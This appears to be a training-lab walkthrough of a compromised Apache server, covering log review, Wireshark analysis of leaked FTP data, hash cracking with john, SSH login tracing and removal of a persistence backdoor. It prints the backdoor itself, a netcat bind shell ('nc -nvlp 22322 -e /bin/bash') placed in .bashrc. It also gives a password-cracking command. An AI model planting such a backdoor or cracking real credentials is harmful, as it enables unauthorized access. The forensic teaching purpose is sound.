# Log Analysis

Any machine exposed to the Internet is at risk of getting compromised. Detecting these attack attempts, even if they are not successful, is crucial for securing servers, hosts or any other asset. When access is gained into a potentially compromised machine, the first thing that should be done is to figure out the attack vectors that could have been used to compromise the device. Since the machine is running a web server, checking logs related to HTTP requests could disclose any malicious activity.

To check the website open a browser window and search for `http://hdmovies.ca`

The website is being hosted in an Apache web server, and the best place to check the web traffic is the Apache access log, which contains all recorded data for requests processed by the Apache server. To do that, go to _/var/log/apache2_ and read the access.log.
`sudo cat /var/log/apache2/access.log.1

Sort the logs and look for anything suspicious. Focus on uncommon User Agents or files that do not appear to be web resources.

What is the name of suspicious file? `dailytraffic.pcapng`
# Analyzing compromised files

After finding the files accessed by the attacker, download it to _/home/kali_ to start analyzing it.
`wget http://hdmovies.ca/filename

Now, it has been determined that the file the attacker downloaded from the server is a **.pcapng** file. **PCAPNG** (Packet Capture Next Generation) file format is related to captured data packets over a network.

To open Wireshark and analyze the downloaded File, use the following command:
`sudo wireshark filename

Start analyzing the traffic for any potentially leaked information that the attacker could have found and used. In the display it is shown that some FTP traffic was captured. Some versions of FTP are not safe to use because they rely on plain text usernames and passwords for authentication and do not use encryption. Following a certain stream, a packet has a leaked file which contains content in plain text.

You can also apply a display filter in wireshark: ftp-data

Right click at hash and go to Follow > TCP Stream and Save As it in _/home/kali/leaked_hash.txt_.

What is the username found in the leaked file? `admin`
# Assessing credential strength

Try and find out if the hash found is weak and if the attacker could have used methods like brute forcing to crack it. Rainbow table attacks are one of the ways used for breaking hash-based authentication. Hash values of most common passwords are generated and stored in files known as rainbow tables. When the plaintext version of a hashed password is needed, the hash gets compared to all the values in that table. One tool that performs such an attack is john. To use it, open the terminal and type the following command:
`john --wordlist=/usr/share/wordlists/rockyou.txt leaked_hash.txt > crackedpassword.txt

Save the output to a new _crackedpassword.txt_ file. Read the file to see if any hash got cracked.

After cracking the file, what is the user's password? `admin`
# Analyzing the intruder's attack pattern

After figuring out that the attacker probably cracked the admin hash, it is safe to assume that those credentials were used to gain access to the system. Let's find out what service the attacker used to log in to the machine. The best approach is to check all running services and see if any of them could provide an entrypoint for the attacker. To do that, use the following command:
`service --status-all

This command will show all the services and their status.

_Secure Shell (SSH)_ is cryptographic protocol that allows secure remote access to a host. If an attacker finds valid credentials, they could gain access to the host via SSH. To check the SSH connection established, read the _/var/log/lastlog_ file.
`cat /var/log/lastlog

From which IP address was the SSH connection established? `172.20.0.7`
# Persistence Investigation

As it is shown, in the previous step there was a SSH connection from the same IP that downloaded the _.pcapng_ file from the server.

For mitigation purposes, it is good practice to shut down any running service that might have been compromised.

Now that it is validated that the attacker gained access to the machine, it is crucial to find further damage that might have occurred. Commonly, after an attacker gains access, they will look to place persistence or backdoors on the machine to allow them to have access at all times. Use the _ps -aux_ command to check all running processes and look out for any suspicious process.
`ps -aux

Reading through the output, a command is displayed that is running **netcat** and listening in **port _22322_**, which executes _/bin/bash_, allowing the attacker to interact with a bash session:

This means that the attacker is using this port to connect to the machine persistently. To find out which script or process is initiating **_nc_**, use `ack`. This tool will look through all the system files to find a specific pattern. The pattern in this case is the `nc` command shown below:
`ack 'nc -nvlp 22322 -e /bin/bash'

The '_nc -nvlp 22322 -e /bin/bash'_ command seems to be executed by the .bashrc file which is a script that gets executed each time a bash session is started. To confirm this, go to _.bashrc_ and read the file. Remove the backdoor by locating the _nc_ command and deleting it.

Where is the .bashrc file located? `/home/kali/.bashrc`
# Terminating the attacker's persistent connection

Be cautious! Even after deleting the backdoor command from the _/home/kali/.bashrc_ file, the process will still run, so kill the process using the kill command. This command allows for process termination based on the process ID. The netstat command executed in the previous step showed the process _ID (PID)_ of the netcat backdoor. Use that ID to terminate the backdoor connection.
`kill ID

Check if the process has been killed by using sudo netstat -tulpn:
`netstat -tulpn